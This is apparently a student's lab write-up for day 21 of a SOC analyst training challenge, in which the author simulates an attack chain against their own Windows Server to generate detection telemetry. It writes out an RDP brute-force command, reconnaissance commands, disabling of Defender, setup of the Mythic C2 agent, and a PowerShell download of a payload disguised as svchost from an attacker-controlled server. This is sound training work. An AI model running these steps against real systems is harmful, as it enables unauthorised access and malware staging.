# Day 21 — Full Attack Simulation: Initial Access to Exfiltration

**Challenge:** MyDFIR 30 Day SOC Analyst Challenge
**Date:** April 2026

---

## Overview

Day 21 was the most hands-on day of the challenge — executing the full six-phase attack chain planned on Day 19. From initial access through to exfiltration using Mythic C2.

---

## What Was Done

### Preparation
Updated firewall rule. Connected to Windows Server via RDP. Created passwords.txt in the Documents directory as the exfiltration target. Had to edit Group Policy to relax the password policy before changing to a simpler password for the brute force demo.

### Phase 1 — Initial Access (Crowbar Issue)
Attempted RDP brute force using Crowbar from Kali Linux:

```bash
crowbar -b rdp -u Administrator -C mydfir-wordlist.txt -s 155.138.210.93/32
```

**Error:** xfreerdp not found initially. Installed freerdp3-x11. Then Crowbar returned no results — port 3389 showed as filtered from Kali despite no firewall on the Windows Server. Root cause: Kali VM behind NAT means traffic appears from laptop IP, not Kali IP.

**Workaround:** Connected directly using xfreerdp:
```bash
xfreerdp /u:Administrator /p:password /v:155.138.210.93
```

### Phase 2 — Discovery
Ran reconnaissance commands inside the Windows Server:
- `whoami`
- `ipconfig`
- `net user`
- `net group`

### Phase 3 — Defense Evasion
Disabled Windows Defender real-time protection. Windows Security confirmed protection was off.

### Phase 4 — Execution
On Mythic server:
```bash
cd /opt/Mythic
./mythic-cli install github https://github.com/MythicAgents/Apollo.git
./mythic-cli install github https://github.com/MythicC2Profiles/http.git
```

Generated payload in Mythic web UI — Apollo agent with HTTP C2 profile. Served payload via Python HTTP server:
```bash
python3 -m http.server 9999
```

Downloaded payload to Windows Server:
```powershell
Invoke-WebRequest -Uri http://[MYTHIC-IP]:9999/svchost-kwesicyber.exe -OutFile "C:\Users\Public\Downloads\svchost-kwesicyber.exe"
```

Python server confirmed GET request from 155.138.210.93 with 200 response — payload downloaded successfully.

### Phase 5 — Command and Control
Executed payload on Windows Server. Process confirmed running via:
```powershell
Get-Process | Where-Object {$_.Name -like "*svchost*"}
```

**Issue:** C2 callback did not appear in Mythic Active Callbacks despite process running and firewall rules being correct. Version differences between the year-old tutorial and current Mythic build (v3.4.32) caused callback issues that were not fully resolved.

### Phase 6 — Exfiltration
Exfiltration via C2 session was not completed due to the unresolved callback issue.

---

## Key Pain Points

| Issue | Resolution |
|---|---|
| xfreerdp not found | Installed freerdp3-x11 |
| Crowbar port filtered | Used xfreerdp direct connection instead |
| mythic-cli not in home directory | Found in /opt/Mythic |
| Port 9999 already in use | Killed existing process with lsof and kill |
| C2 callback not appearing | Unresolved — version difference suspected |

---

## Key Takeaways

- Kali Linux running as a VM behind NAT will have its traffic appear as the host machine IP — this affects tools that need direct connectivity like Crowbar
- Always verify the Python HTTP server is running plain HTTP not HTTPS when serving payloads
- Version differences between tutorial and current tool versions are expected and require independent troubleshooting
- Even without a successful C2 callback, the attack simulation generated real telemetry in Elasticsearch from the brute force attempts, process creation and Defender disablement

---

*Day 21 of 30 complete.*
